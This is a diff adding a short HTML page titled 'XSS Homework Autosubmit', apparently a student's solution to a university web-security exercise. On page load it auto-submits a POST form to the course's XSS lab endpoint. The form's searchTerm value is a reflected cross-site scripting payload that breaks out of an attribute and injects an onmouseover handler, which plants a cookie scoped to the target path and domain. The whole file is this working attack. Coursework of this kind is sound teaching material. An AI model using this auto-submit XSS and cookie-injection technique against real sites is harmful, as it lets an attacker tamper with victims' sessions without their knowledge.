@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://webappsec.cs.ut.ee/xss/homework.php">
+    <title>XSS Homework Autosubmit</title>
+</head>
+<body onload="XSSOnLoad.submit()">
+    <form action="https://webappsec.cs.ut.ee/xss/homework.php" method="POST" name="XSSOnLoad">
+        <input type="text" name="searchTerm" value='"onmouseover="document.cookie=&apos;searchTerm=CompetitivePathCookie;Path=/xss/homework.php;Domain=.webappsec.cs.ut.ee&apos;"'/>
+        <input type="submit" value="Search"/>
+    </form>
+</body>
+</html>
